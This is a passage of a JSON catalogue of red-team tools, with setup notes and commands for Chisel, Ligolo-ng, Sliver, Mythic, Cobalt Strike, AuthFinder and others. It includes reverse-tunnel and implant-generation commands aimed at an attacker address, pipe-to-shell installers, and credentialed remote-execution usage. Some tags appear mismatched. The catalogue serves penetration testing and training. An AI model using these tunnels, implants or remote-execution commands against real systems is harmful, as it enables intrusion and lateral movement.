      "exploitation",
      "web",
      "mailing list"
    ]
  },
  {
    "name": "searchsploit",
    "url": "https://www.exploit-db.com/searchsploit",
    "cat": "red",
    "type": "tool",
    "desc": "Offline exploit database search",
    "details": "## Description\nSearchsploit is a command line search tool for Exploit-DB. It allows you to take a copy of the exploit database with you offline.\n\n## Setup\n```bash\nsudo apt install exploitdb\n```\n\n## Usage\nSearch for vulnerabilities by software name and version. It provides paths to the exploit code.\n\n## Useful Commands\n```bash\n# Search for a term\nsearchsploit wordpress 5.0\n\n# Mirror exploit to current folder\nsearchsploit -m 12345.py\n```\n\n## Alternatives\n- **Online CVE Databases**",
    "source": "https://github.com/offensive-security/exploitdb",
    "binaries": null,
    "tags": [
      "exploitation",
      "database",
      "search"
    ]
  },
  {
    "name": "Chisel",
    "url": "https://github.com/jpillora/chisel",
    "cat": "red",
    "type": "tool",
    "desc": "TCP tunneling over HTTP",
    "details": "## Description\nChisel is a fast TCP/UDP tunnel over HTTP. It is useful for passing through firewalls that only allow HTTP traffic.\n\n## Setup\nDownload binary from releases (requires binary on both Client and Server).\n\n## Usage\nSet up a server on your machine and a client on the target to forward ports.\n\n## Useful Commands\n```bash\n# Server (Attacker machine)\n./chisel server -p 8000 --reverse\n\n# Client (Victim machine)\n./chisel client 10.10.10.10:8000 R:8888:127.0.0.1:8888\n```\n\n## Alternatives\n- **Ligolo-ng**\n- **SSH Remote Forwarding**",
    "source": "https://github.com/jpillora/chisel",
    "binaries": "https://github.com/jpillora/chisel/releases",
    "tags": [
      "web",
      "network",
      "malware analysis"
    ]
  },
  {
    "name": "Ligolo-ng",
    "url": "https://github.com/nicocha30/ligolo-ng",
    "cat": "red",
    "type": "tool",
    "desc": "Modern tunneling and pivoting tool",
    "details": "## Description\nLigolo-ng is an advanced pivoting tool using TUN interfaces. It provides better performance and usability than Chisel or Proxychains.\n\n## Setup\nDownload proxy (for attacker) and agent (for target) binaries.\n\n## Usage\nIt creates a VPN-like connection between attacker and victim, allowing you to route traffic directly to internal networks.\n\n## Workflow\n1. (Attacker) Create TUN interface and run proxy.\n2. (Target) Run agent connecting back to proxy.\n3. (Attacker) Add route to target subnet.\n\n## Alternatives\n- **Chisel**\n- **Sshuttle**",
    "source": "https://github.com/nicocha30/ligolo-ng",
    "binaries": "https://github.com/nicocha30/ligolo-ng/releases",
    "tags": [
      "post-exploitation",
      "web"
    ]
  },
  {
    "name": "Updog",
    "url": "https://github.com/sc0tfree/updog",
    "cat": "red",
    "type": "tool",
    "desc": "Simple file transfer HTTP server",
    "details": "## Description\nUpdog is a replacement for `python -m http.server`. It allows downloading *and* uploading files via the browser.\n\n## Setup\n```bash\npip install updog\n```\n\n## Usage\nStart the server in a directory to serve files. It provides a clean web interface.\n\n## Useful Commands\n```bash\n# Start server on port 8000\nupdog -p 8000\n\n# Start with SSL\nupdog --ssl\n```\n\n## Alternatives\n- **Python http.server**\n- **HFS**",
    "source": "https://github.com/sc0tfree/updog",
    "binaries": null,
    "tags": [
      "scanning",
      "web"
    ]
  },
  {
    "name": "Atomic Red Team",
    "url": "https://atomicredteam.io/",
    "cat": "red",
    "type": "tool",
    "desc": "Small, focused ATT&CK technique tests",
    "details": "## Description\nAtomic Red Team is a library of simple tests that every security team can execute to test their controls. Each test is mapped to MITRE ATT&CK.\n\n## Setup\n```powershell\nIEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing); \nInstall-AtomicRedTeam\n```\n\n## Usage\nExecute specific techniques to see if your security tools detect or block the behavior.\n\n## Useful Commands\n```powershell\n# Run a specific technique (e.g., T1003)\nInvoke-AtomicTest T1003\n```\n\n## Alternatives\n- **Caldera**",
    "source": "https://github.com/redcanaryco/atomic-red-team",
    "binaries": null,
    "tags": [
      "web",
      "framework"
    ]
  },
  {
    "name": "Cobalt Strike (concept)",
    "url": "https://www.cobaltstrike.com/",
    "cat": "red",
    "type": "tool",
    "desc": "Commercial adversary simulation platform",
    "details": "## Description\nCobalt Strike is a commercial adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors.\n\n## Setup\nCommercial license required. Java based.\n\n## Usage\nUse the client to manage 'Beacons' (agents) deployed on target machines. It provides powerful lateral movement and data exfiltration capabilities.\n\n## Key Features\n- **Malleable C2:** Change network traffic indicators to look like legitimate traffic (e.g., jQuery, Amazon).\n- **Beacon:** The payload agent.\n\n## Alternatives\n- **Sliver**\n- **Havoc**",
    "source": null,
    "binaries": null,
    "tags": [
      "post-exploitation",
      "exploitation",
      "network"
    ]
  },
  {
    "name": "Sliver",
    "url": "https://sliver.sh/",
    "cat": "red",
    "type": "tool",
    "desc": "Open-source red team C2 framework",
    "details": "## Description\nSliver is an open source cross-platform adversary emulation/red team framework. It supports C2 over Mutual-TLS, HTTP(S), and DNS.\n\n## Setup\n```bash\n# Linux Installer\ncurl https://sliver.sh/install|sudo bash\n```\n\n## Usage\nGenerate implants for targets and manage them via the Sliver console. It offers robust features comparable to commercial tools.\n\n## Useful Commands\n```bash\n# Start server\nsliver-server\n\n# Generate implant\ngenerate --mtls 10.10.10.10 --save /tmp/implant\n```\n\n## Alternatives\n- **Mythic**\n- **Cobalt Strike**",
    "source": "https://github.com/BishopFox/sliver",
    "binaries": "https://github.com/BishopFox/sliver/releases",
    "tags": [
      "post-exploitation",
      "web",
      "dns"
    ]
  },
  {
    "name": "Mythic",
    "url": "https://docs.mythic-c2.net/",
    "cat": "red",
    "type": "tool",
    "desc": "Pluggable C2 framework",
    "details": "## Description\nMythic is a collaborative, multi-platform, red teaming framework. It uses a web interface and docker containers for different agents (Payload Types).\n\n## Setup\n```bash\ngit clone https://github.com/its-a-feature/Mythic\ncd Mythic\n./install_docker_ubuntu.sh\nmake\n```\n\n## Usage\nInstall specific agents (like Apollo, Poseidon) into Mythic and control them via the web UI.\n\n## Alternatives\n- **Sliver**",
    "source": "https://github.com/its-a-feature/Mythic",
    "binaries": null,
    "tags": [
      "post-exploitation",
      "exploitation",
      "web"
    ]
  }, 
  
  {
    "name": "AuthFinder",
    "url": "https://github.com/KhaelK138/authfinder",
    "website": "https://github.com/KhaelK138/authfinder",
    "source": "https://github.com/KhaelK138/authfinder",
    "binaries": "https://pypi.org/project/authfinder/",
    "cat": "blue",
    "type": "tool",
    "desc": "Credential-based remote command execution orchestrator (wrapper over NetExec/Impacket/Evil-WinRM)",
    "details": "AuthFinder is a wrapper tool that attempts multiple remote execution techniques against Windows (and optionally Linux) targets using provided credentials, stopping when one method succeeds (or optionally trying all). It streamlines “try the common RCE paths” workflows by orchestrating tools like NetExec, Impacket, and Evil-WinRM.\n\n## Overview\nAuthFinder’s core value is reducing friction when you already have credentials and need to quickly determine which remote execution path is available (e.g., WinRM vs SMB-based execution vs WMI). It can run commands concurrently across multiple targets and report which method worked.\n\n## Setup\nInstall the AuthFinder CLI with pipx (recommended) and then install the external tools it wraps.\n\n```bash\n# AuthFinder\npipx install authfinder\n\n# External dependencies (commonly used by AuthFinder)\n# Impacket (PSExec/AtExec/MSSQL, etc.)\npipx install impacket\n\n# NetExec (SMBExec/WMI/RDP/SSH, depending on configuration)\npipx install git+https://github.com/Pennyw0rth/NetExec\n\n# Evil-WinRM (WinRM execution)\ngem install evil-winrm\n```\n\n## Practical use\nAuthFinder is best used in authorized assessment / incident-response lab workflows where you need to validate remote management exposure and execution paths with known credentials.\n\nExample pattern:\n- Provide a target (single host or list), a username, a credential, and a command.\n- AuthFinder will try supported methods in sequence (or in a specified order) and return the first success.\n\nGeneric usage shape (placeholders):\n```bash\nauthfinder <target-or-targets> <username> <password-or-hash> \"<command>\"\n```\n\nOperational knobs that matter:\n- Increase/decrease concurrency with `--threads`.\n- Restrict which techniques are attempted with `--tools <list>`.\n- Use `--timeout <seconds>` for slow/latent environments.\n- Use `--run-all` if you want to validate every available method rather than stopping at first success.\n- Use `--linux` to switch into SSH-focused mode for Linux targets.\n\n## Notes\n- This tool can trigger endpoint/network detections; treat it as a controlled activity and expect logs/alerts.\n- Results depend heavily on target configuration (WinRM enabled, SMB signing, admin shares, WMI permissions, firewall rules, AV/EDR policy).\n- Because it wraps multiple tools, troubleshooting often involves running the underlying tool directly (NetExec/Impacket/Evil-WinRM) to see full error context.\n- Intended for systems you own or where you have explicit authorization to test.\n\n## Alternatives\n- **NetExec**: Directly run SMB/WMI/RDP/SSH execution modules without a wrapper.\n- **Impacket**: Use individual executors (psexec/wmiexec/atexec/mssqlclient) for finer control.\n- **Evil-WinRM**: Best-in-class interactive WinRM workflow.\n- **CrackMapExec** (legacy): Older predecessor to NetExec with similar goals."
    ,
    "tags": [
      "windows",
      "remote-exec",
      "credentialed-access",
      "lateral-movement",
      "incident-response",
      "pentest"
    ]
  }

);